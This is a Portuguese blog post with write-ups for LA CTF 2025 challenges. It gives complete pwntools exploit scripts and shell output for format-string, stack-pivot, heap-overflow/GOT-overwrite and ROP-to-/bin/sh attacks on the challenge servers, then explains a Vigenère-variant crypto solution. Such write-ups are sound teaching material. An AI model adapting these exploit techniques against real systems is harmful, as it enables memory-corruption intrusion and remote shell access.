+++
date = 2025-02-17T02:17:31-03:00
lastmod = 2025-02-18T18:40:04-03:00
draft = false
title = "LA CTF 2025"
description = "Writeups dos desafios do LA CTF 2025."
tags = ['CTF', 'Cibersegurança']
categories = []
featured = true
+++

# Introdução
O Epic Leet Team jogou o LA-CTF que ocorreu no final de semana do dia 08 até 09 de fevereiro.  Os challenges de pwning foram resolvidos pelo professor orientador da frente de red team do projeto (com ocasionais ajudas de outros membros), e eu (Vini) embora com menos experiência, acompanhei a resolução dos desafios. Os challenges de crypto foram resolvidos pelo professor orientador, membros do ELT e a Laura, que no primeiro CTF dela resolveu um desafio e acompanhou as outras resoluções.

# PWN
## pwn/2password

O código do challenge a seguir, inicialmente procuramos algo como um stack buffer overflow mas após algum tempo observando o código, encontramos a vulnerabilidade de format string. Apesar do binário possuir algumas mitigações, como PIE e Partial RELRO, nenhuma dessas impede a vulnerabilidade de ser explorada.

``` 2password.c
char *__fastcall readline(char *buf, int size, FILE *file)
{
  char *result; // rax

  if ( !fgets(buf, size, file) )
  {
    puts("wtf");
    exit(1);
  }
  result = strchr(buf, 10);
  if ( result )
    *result = 0;
  return result;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char flag[48]; // [rsp+0h] [rbp-D0h] BYREF
  char password2[48]; // [rsp+30h] [rbp-A0h] BYREF
  char password1[48]; // [rsp+60h] [rbp-70h] BYREF
  char username[56]; // [rsp+90h] [rbp-40h] BYREF
  FILE *flag_file; // [rsp+C8h] [rbp-8h]

  setbuf(stdout, 0LL);
  printf("Enter username: ");
  readline(username, 42LL, stdin);
  printf("Enter password1: ");
  readline(password1, 42LL, stdin);
  printf("Enter password2: ");
  readline(password2, 42LL, stdin);
  flag_file = fopen("flag.txt", "r");
  if ( !flag_file )
  {
    puts("can't open flag");
    exit(1);
  }
  readline(flag, 42LL, flag_file);
  if ( !strcmp(username, "kaiphait") && !strcmp(password1, "correct horse battery staple") && !strcmp(password2, flag) )
  {
    puts("Access granted");
  }
  else
  {
    printf("Incorrect password for user ");
    printf(username);
    putchar(10);
  }
  return 0;
}
```

A vulnerabilidade está na linha `printf(username);`.
Essa linha usa o `username` (controlado pelo usuário) diretamente em `printf` sem um _format specifier_ (como `%s`). Se nossa entrada contiver _format specifiers_ (ex: `%p`, `%x`), o `printf` vai vazar dados da _stack_!
A _flag_ é lida em um _buffer_ na _stack_ (`char flag[48]`). Como `username` também é uma variável na _stack_, a _flag_ pode estar próxima na memória. Com o _PIE_ ativado, endereços absolutos são randomizados, mas posições relativas na _stack_ durante uma execução permanecem consistentes.

A seguir o exploit que utilizamos para obter a flag:

``` exploit.py
import re
from pwn import *
pos = 1
while True:
    r = remote('chall.lac.tf', 31142)
    username = b''
    while True:
        fmt = b'%%%dp'%pos
        if len(username + fmt) > 40:
            break
        username += fmt
        pos += 1
    print(username)
    r.sendline(username)
    r.sendline(b'password1')
    r.sendline(b'password2')
    r.recvuntil(b'Incorrect password for user ')
    line = r.recvline().decode().strip()
    for m in re.finditer(r'0x[0-9a-f]{1,16}', line):
        val = int(m.group(0), 16)
        print('%016x'%val, repr(p64(val)))
```

Passo a passo:
1. **Payload de Format String**: O _username_ é preenchido com `%1p`, `%2p`, etc. Cada `%p` lê um valor da _stack_ e o exibe como _pointer_ (hex).
2. **Gatilho da Vulnerabilidade**: Quando o programa faz `printf(username)` com username guardando os *format specifiers*, os dados vazados são imprimidos.
3. **Interpretando Dados Vazados**: Essa saída contém valores hex (como `0x7ffdecfe4240`). Eles são convertidos em _chunks_ de 8 bytes e interpretados como _strings_.

Por que funciona?
- A _flag_ está armazenada na _stack_ em `flag[48]`.
- Usando _specifiers_ `%p`, extraímos memória adjacente da _stack_, que inclui os bytes da _flag_.
- Os valores hex vazados são convertidos em _byte strings_ (little-endian), revelando partes da _flag_.

Finalmente, temos a flag!
```
[+] Opening connection to chall.lac.tf on port 31142: Done
b'%1p%2p%3p%4p%5p%6p%7p%8p%9p%10p%11p%12p'
00007ffdecfe4240 b'@B\xfe\xec\xfd\x7f\x00\x00'
000057d01f2a34a8 b'\xa84*\x1f\xd0W\x00\x00'
75687b667463616c b'lactf{hu'
66635f327265746e b'nter2_cf'
07d38367a7830630 b'0\x06\x83\xa7g\x83\xd3\x07'
0000000000000002 b'\x02\x00\x00\x00\x00\x00\x00\x00'
64726f7773736170 b'password'
[+] Opening connection to chall.lac.tf on port 31142: Done
b'%13p%14p%15p%16p%17p%18p%19p%20p%21p%22p'
00007ffdf3d45450 b'PT\xd4\xf3\xfd\x7f\x00\x00'
000058d3348214a8 b'\xa8\x14\x824\xd3X\x00\x00'
75687b667463616c b'lactf{hu'
66635f327265746e b'nter2_cf'
007d38367a783063 b'c0xz68}\x00'
```

## pwn/state-change
Neste challenge temos uma variável global que precisa ser sobrescrita de alguma maneira. Além disso, precisamos de alguma maneira redirecionar o ponteiro de instrução para a função win(), pois no fluxo normal de execução do programa ela não é chamada.

``` chall.c
#include <stdio.h>
#include <string.h>

char buf[0x500]; // Wow so useful
int state;
char errorMsg[0x70];

void win() {
    char filebuf[64];
    strcpy(filebuf, "./flag.txt");
    FILE* flagfile = fopen("flag.txt", "r");

    /* ********** ********** */
    // Note this condition in win()
    if(state != 0xf1eeee2d) {
        puts("\ntoo ded to gib you the flag");
        exit(1);
    }
    /* ********** ********** */
    
    if (flagfile == NULL) {
        puts(errorMsg);
    } else {
        char buf[256];
        fgets(buf, 256, flagfile);
        buf[strcspn(buf, "\n")] = '\0';
        puts("Here's the flag: ");
        puts(buf);
    }
}

void vuln(){
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin);
}

int main(){

    state = 0xdeaddead;
    strcpy(errorMsg, "Couldn't read flag file. Either create a test flag.txt locally and try connecting to the server to run instead.");

    setbuf(stdin, 0);
	setbuf(stdout, 0);

    vuln();
    
    return 0;
}   
```
Note o momento que o stack buffer overflow ocorre: 
`fgets(local_buf, 0x30, stdin);`, estourando o limite de `local_buf[0x20]`.

Algumas considerações:
- A variável global '*state*' precisa ser sobrescrita para '*0xf1eeee2d*'
- A variável global '*buf*' será utilizada para guardar o valor de RBP
- Devido ao limite imposto por '*fgets*', payload pode ter no máximo 48 bytes (o que impede de fazer um ROP visto que só dá para redirecionar para um endereço).
- Além de usar algum *gadget* para alterar a variável global '*state*', também é necessário saltar para '*win()*' de alguma maneira, como fazer isso se praticamente só é possível pular para um endereço?
- Precisaremos de algum jeito de retornar a execução para *vuln()* para poder enviar mais *input* para o binário e realizar um salto no programa.

Obtivemos a flag com o seguinte exploit:
``` exploit.py 
from pwn import *
exe = ELF('./chall')
context.terminal = ["alacritty", "-e", "bash", "-c"]
#r = gdb.debug(['./chall'], gdbscript='''
#tbreak *0x4012EA
#continue
#''')
r = remote('chall.lac.tf', 31593)
r.send(32*b'A'+p64(exe.symbols['state']+0x20)+p64(0x4012D0)[:-1])
r.send(p32(0xF1EEEE2D)+(32-4)*b'A'+p64(exe.symbols['buf']+0x500)+p64(exe.symbols['win'])[:-1])
r.interactive()
```

`r.send(32*b'A'+p64(exe.symbols['state']+0x20)+p64(0x4012D0)[:-1])` 
No primeiro '*send*' o buffer é preenchido com 32 caracteres + (o endereço da variável state + 0x20) + o endereço cujo o programa irá saltar: (0x4012d0). 
O endereço da variável state somado a 0x20 acaba substituindo  o conteúdo de RBP.
Vamos analisar por que esse endereço é importante procurando por esse endereço após executar um `objdump -M intel -d ./chall`:

```
  4012d0:       48 8b 15 59 2d 00 00    mov    rdx,QWORD PTR [rip+0x2d59]        # 404030 <stdin@GLIBC_2.2.5>
  4012d7:       48 8d 45 e0             lea    rax,[rbp-0x20]
  4012db:       be 30 00 00 00          mov    esi,0x30
  4012e0:       48 89 c7                mov    rdi,rax
  4012e3:       e8 d8 fd ff ff          call   4010c0 <fgets@plt>
  4012e8:       90                      nop
  4012e9:       c9                      leave
  4012ea:       c3                      ret
```

Esse endereço está dentro da função '*vuln()*', esse gadget é relevante pois eventualmente o fluxo avança até '*fgets*' (o que permite que possamos mandar a segunda parte do exploit). Outro ponto relevante no gadget é a instrução '*lea*' (*load effective address*) que irá carregar o valor que RBP aponta - 0x20 carregando o valor de '*state*' em RAX.  O valor de RAX é movido para RDI que apontará para o endereço no qual '*fgets*' salvará o input recebido. 

Após essa breve explicação do gadget utilizado, iremos para a segunda parte do payload. 
`r.send(p32(0xF1EEEE2D)+(32-4)*b'A'+p64(exe.symbols['buf']+0x500)+p64(exe.symbols['win'])[:-1])i`
Nesse segundo send, já iniciamos colocando o valor desejado (que será armazenado no endereço de 'state') 0xF1EEEE2D. Em seguida completamos o restante do buffer original (preenchendo o resto do buffer com caracteres) e colocamos o endereço do buffer (somado com 0x500) que sobrescreverá o endereço de RBP (que é o endereço que  o programa saltará quando chegar na instrução leave (0x4012e9), evitando que o programa salte para algum lugar que possa crashar e evitar a necessidade de apontar para o prologo de uma função), por fim o endereço de win() que é para onde de fato o programa saltará, dessa vez com a variável global '*state*' definida com o desejado.

```
[*] '/home/matias/ctf/lactf/state-change/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to chall.lac.tf on port 31593: Done
[*] Switching to interactive mode
Hey there, I'm deaddead. Who are you?
Here's the flag:
lactf{1s_tHi5_y0Ur_1St_3vER_p1VooT}
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to chall.lac.tf port 31593
[*] Got EOF while sending in interactive
```

## pwn/gamedev
Esse desafio consiste em Heap Overflow. Vamos lá:
- Heap Overflow no '*edit_level*'.
- O programa fornece um '*infoleak*' (vaza o endereço da '*main()*' no começo da execução).\
- A diferença do endereço efetivo da '*main()*' (randomizada) com o endereço da main no binário nos fornece o endereço base do binário.
- A partir desse endereço podemos calcular  endereço de '*puts*' na '*got*' ('*Global offset table*').
- Em seguida, três levels são criados: B, C e D, com seus respectivos índices: 0, 1 e 2.
- A função explore é executada em B.
- Level B é editado, enchendo o tamanho do buffer (com 0x20 caracteres) + Metadatados da Heap (Chunk Header) (0x71 ou (0x70| 1) que implica em um chunk de tamanho 0x70 e que o Chunk anterior está em uso)+ Endereço de 'got_puts - 64'. Esses 64 bytes vem  de 8 * 8 (tamanho de um ponteiro em x86_64).
- Esse overflow de B sobrescreve dados de C, de maneira que o ponteiro `next\[0\]`  de level C é sobrescrito.
- Quando explore é realizado em C, seu `curr = curr->next[0]` aponte para `got_puts - 64`, quando esse puts é executado, o endereço real da *got* é vazado.
- Com base nesse endereço é possível calcular o offset dentro da '*libc*' para '*system*'.
- Um payload é construído (estourando a heap de maneira similar a primeira etapa) para sobrescrever a got com o endereço de '*system*', nessa etapa acabou-se sobrescrevendo o ponteiro para diversas funções além da que se desejava inicialmente: '*atoi*' (*malloc/setvbuf/atoi/exit* também foram sobrescritas).
- Qualquer interação com o menu eventualmente executa '*atoi*', então system acaba sendo executada de qualquer maneira juntamente com o argumento controlado pelo atacante.

Código do exploit:
```
from pwn import *

# Set up the process
context.terminal = ["alacritty", "-e", "bash", "-c"]
#p = process(['./ld-linux-x86-64.so.2', './chall'], env={'LD_LIBRARY_PATH':'.'}, aslr=False)
p = remote('chall.lac.tf', 31338)
exe = ELF('./chall')
context.arch = exe.arch
libc = ELF('./libc.so.6')  # Adjust to target libc

context.log_level = 'debug'

# Leak main address
p.recvuntil(b'A welcome gift: ')
main_leak = int(p.recvline().strip(), 16)
log.info(f"Leaked main address: {hex(main_leak)}")

# Calculate binary base (adjust main offset based on the binary)
main_offset = exe.symbols['main']
binary_base = main_leak - main_offset
log.info(f"Binary base: {hex(binary_base)}")

# Calculate GOT address of puts (adjust got_puts_offset based on the binary)
got_puts_offset = exe.got['puts']
got_puts = binary_base + got_puts_offset
log.info(f"GOT puts address: {hex(got_puts)}")

log.info(f"Start address: {hex(binary_base + exe.symbols['start'])}")
log.info(f"Prev address: {hex(binary_base + exe.symbols['prev'])}")
log.info(f"Curr address: {hex(binary_base + exe.symbols['curr'])}")

# Create Level B
p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Enter level index: ', b'0')

# Create Level C
p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Enter level index: ', b'1')

# Create Level D
p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Enter level index: ', b'2')

# Explore Level B
p.sendlineafter(b'Choice: ', b'4')
p.sendlineafter(b'Enter level index: ', b'0')

# Edit Level B to overflow into Level C's next[0]
payload = b'A' * 0x20  # Fill Level B's data
payload += p64(0) + p64(0x71) # Metadata between Levels
payload += p64(got_puts - 64)  # Overwrite Level C's next[0]
payload += p64(0)     # Fill remaining overflow space

p.sendlineafter(b'Choice: ', b'2')
p.sendafter(b'Enter level data: ', payload)

# Reset to Level A
p.sendlineafter(b'Choice: ', b'5')
p.sendlineafter(b'Choice: ', b'5')

# Explore to Level C
p.sendlineafter(b'Choice: ', b'4')
p.sendlineafter(b'Enter level index: ', b'1')

# Explore to Level C's next[0] (GOT entry -64)
p.sendlineafter(b'Choice: ', b'4')
p.sendlineafter(b'Enter level index: ', b'0')

# Leak puts address
p.sendlineafter(b'Choice: ', b'3')
p.recvuntil(b'Level data: ')
#puts_addr = u64(p.recv(8).ljust(8, b'\x00'))
got_leak = p.recv(0x20)
puts_addr = u64(got_leak[:8])
log.info(f"Leaked puts address: {hex(puts_addr)}")

# Calculate system address
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
log.info(f"System address: {hex(system_addr)}")

#gdb.attach(p, exe='./chall')
#pause()

# We need to overwrite 0x40 bytes, i.e. we have 8 pointers in GOT to overwrite
"""
.got.plt:0000000000004008 off_4008        dq offset puts          ; DATA XREF: _puts↑r
.got.plt:0000000000004010 off_4010        dq offset write         ; DATA XREF: _write↑r
.got.plt:0000000000004018 off_4018        dq offset printf        ; DATA XREF: _printf↑r
.got.plt:0000000000004020 off_4020        dq offset fgets         ; DATA XREF: _fgets↑r
.got.plt:0000000000004028 off_4028        dq offset malloc        ; DATA XREF: _malloc↑r
.got.plt:0000000000004030 off_4030        dq offset setvbuf       ; DATA XREF: _setvbuf↑r
.got.plt:0000000000004038 off_4038        dq offset atoi          ; DATA XREF: _atoi↑r
.got.plt:0000000000004040 off_4040        dq offset exit          ; DATA XREF: _exit↑r
"""
# We are interested in overwriting atoi with system, but we end up overwriting malloc/setvbuf/atoi/exit
# (because we don't have their values to restore) and keep other pointers with their original values
p.sendlineafter(b'Choice: ', b'2')
p.sendafter(b'Enter level data: ', got_leak + 4*p64(system_addr))
+++
```

Desse modo obtendo a flag:
```
Choice: $ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x1e bytes:
    b'uid=1000 gid=1000 groups=1000\n'
uid=1000 gid=1000 groups=1000
[DEBUG] Received 0x63 bytes:
    b'==================\n'
    b'1. Create level\n'
    b'2. Edit level\n'
    b'3. Test level\n'
    b'4. Explore\n'
    b'5. Reset\n'
    b'6. Exit\n'
    b'Choice: '
==================
1. Create level
2. Edit level
3. Test level
4. Explore
5. Reset
6. Exit
Choice: $ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x3d bytes:
    b'lactf{ro9u3_LIk3_No7_R34LlY_RO9U3_H34P_LIK3_nO7_r34llY_H34P}\n'
lactf{ro9u3_LIk3_No7_R34LlY_RO9U3_H34P_LIK3_nO7_r34llY_H34P
```
## pwn/minceraft (não terminado)

Mais um challenge que possui '*ASLR*' e precisamos de um '*infoleak*'.
- Não encontramos nenhum gadget útil para ROP.
- Algumas horas quebrando a cabeça tentando controlar RDI de alguma maneira...
- Finalmente tivemos a idéia de utilizar [ret2gets](https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets) para vazar libc.
Confesso que preciso estudar com mais calma a técnica previamente citada, então o writeup desse challenge como fica em 'não terminado', nas minhas férias volto aqui!

```
from pwn import *

context.terminal = ["alacritty", "-e", "bash", "-c"]
#p = process(['./ld-linux-x86-64.so.2', './chall'], env={'LD_LIBRARY_PATH': '.'}, aslr=False)
p = remote('chall.lac.tf', 31137)
context.binary = exe = ELF('./chall')
libc = ELF('./libc.so.6')  # Adjust to target libc

context.log_level = 'debug'

"""
gdb.attach(p, exe='./chall', gdbscript='''
file ./chall
break *0x401388
continue
''')
"""

def send_payload(payload):
    p.sendlineafter(b'2. Multiplayer', b'1')
    p.sendlineafter(b'Enter world name:', payload)
    p.sendlineafter(b'2. Creative', b'1')
    p.sendlineafter(b'2. Exit', b'2')

# leak libc address, see https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets

rop = ROP(context.binary)
rop.call('gets', [])
rop.call('gets', [])
rop.call('puts', [])
rop.call('main', [])
print(rop.dump())

send_payload(
    64*b'A' +
    p64(0) +  # saved rbp
    rop.chain()
)
p.sendline(b"A" * 4 + b"\x00"*3)
p.recvuntil(b'\x41\x41\x41\x41\xff\xff\xff\xff')

tls = u64(p.recvline(keepends=False).ljust(8, b'\x00'))
log.info(f"tls: {hex(tls)}")

libc.address = tls + 0x28c0
log.info(f"libc: {hex(libc.address)}")

log.info(f"system: {hex(libc.symbols['system'])}") 

# mount second ROP now that we have libc address
# libc should have enough gadgets ;D

bin_sh = next(libc.search(b'/bin/sh'))
rop = ROP(libc)
rop.execve(bin_sh, 0, 0)
print(rop.dump())

send_payload(
    64*b'A' +
    p64(0) +  # saved rbp
    rop.chain()
)

p.interactive()
```

# Crypto

Laura aqui! 

## crypto/too-loud-to-yap

Esse foi o primeiro desafio que eu resolvi num CTF, que pode ser resolvido coma ajuda uma ferramenta online para fazer a decifração automática, eu usei o [CyberChef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('')). Aqui a descrição do problema:
> AAAAA
>i love AAAAA telling and posting stories! you could AAAAA say its something of a heritage for me :3
>unfortunately, when i AAAAA tried telling this story about "autos", some guy kept YELLING "AAAAA" in the background which AAAAA kept messing up my new take on the vigenere cipher! he actually started yelling right AAAAA when i started my story :( weh...

E aqui o texto cifrado com a flag:
>LACTF
>Here’s HERES a thing THING that htwpxues is brh ht al jfnqlij. Q anv lparw. THERE
>Basicbldg, ye hppa awpbmjg oyea zks ovwlastn, xwlvsgg llwhz spaymzwzk fliaozklraf. O elafs ba pnn bh ko zbhk o iwope MOVIEA.
>Then tapw onz ausywujvw yr, zxgjh STOPS next tb yp, tgr u tuafh pz cgvdqt awis “Hkeg dlhd Pea” THCISA shirtk jtzftgo wgu eqr mmaewww bvtxlok hbu hv. P emm ecjcztx npk olcxhn i dsx wop, jnm W abhtoqd go gzrbr bmibdmzttttwm br ocvoe lcz gnjwi yhgmj.
>N sjsmbwk "OUTED lactf{ooyg_blhd_pea_ubu}!"
>Ixuyj fnzyinvm ilb jnon’l WHATS happeuicv, M fbnxbww akmefkbgg vrmz htjo, sftvstk mamz uym sr vnr.
>Vj die xyetw QUITE injurmq kok M fbfemf ntyi-ram-brs nrr ui mngl e ruop rjwzgvva oo xyc ATTHE hospiaod. X ets qqje, onbu sjtr h qhe mn os tfz ffak faly itagftd nr.

De início já temos duas informações importantes:
- A [cifra de Vigenère](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) foi usada em algum lugar
- Vão aparecer alguns "AAAAA" perdidos no meio do texto cifrado

Depois de observar o texto cifrado fica claro onde estão os "AAAAA"s, inclusive a maioria deles estão cifrados para palavras comuns do inglês. Isso na verdade demontra uma característica da cifra de Vigenère, que **quando a letra cifradora/cifrada é um "a" na verdade esse caractere permanece na sua forma original**, ainda decodificado. Dessa forma, no lugar de cada "AAAAA" temos a chave usada na cifração.

Observando o texto cifrado é claro que cada palavra tem uma chave diferente, e pela segunda linha é fácil de deduzir que a palavra anterior no texto original é a chave de cada palavra. Bom, esse foi o meu primeiro chute...

>Here’s **HERES** a thing **THING** that htwpxues is brh ht al jfnqlij. Q anv lparw. **THERE**

Se você tentar decifrar "lparw" para conseguir "there", a chave obtida vai ser "siwas", e até onde eu sei essa não é uma palavra em inglês. Então, a chave usada não é simplesmente a palavra anterior, até porque isso não indica o que acontece quando palavras em sequência não têm o mesmo tamanho nem como a primeira palavra foi cifrada.

> **Basicbldg**, ye hppa awpbmjg oyea...

Aí eu percebi que a primeira palavra do terceiro parágrafo era "Basicblgd" e só as últimas 4 letras realmente foram cifradas pelo "AAAAA" anterior. Eu deduzi que a palavra era "Basically", então a chave só poderia ser "AAAAABasi", BINGO! A partir disso, eu testei outras palavras para garantir que eu tinha entendido:

- Na linha 2: 
	- thing<--AAAAa--thing | Como o "a" só usou uma letra dos "AAAAA", o resto delas foi usado aqui com o "a"
    - htwpxues<--Athathap--happened | Usa o "A" que sobrou de "THING", o "that" e as 3 primeiras letras dela "hap"
- A primeira palavra:
	- LACTF<--lactf--AAAAA | O escritor escolheu "LACTF" como a chave da primeira palavra
- Na linha da flag:
	- OUTED<--outed--AAAAA | Esse "AAAAA" permite que a flag seja obtida sem decifrar o resto do texto
	- lactf<--AAAAA--lactf | O início da flag!
	- ooyg<--lact--down | O "f" de "lactf" vai começar a chave da próxima palavra

Seguindo essa lógica você vai conseguir:
`lactf{down_with_cis_bus}`
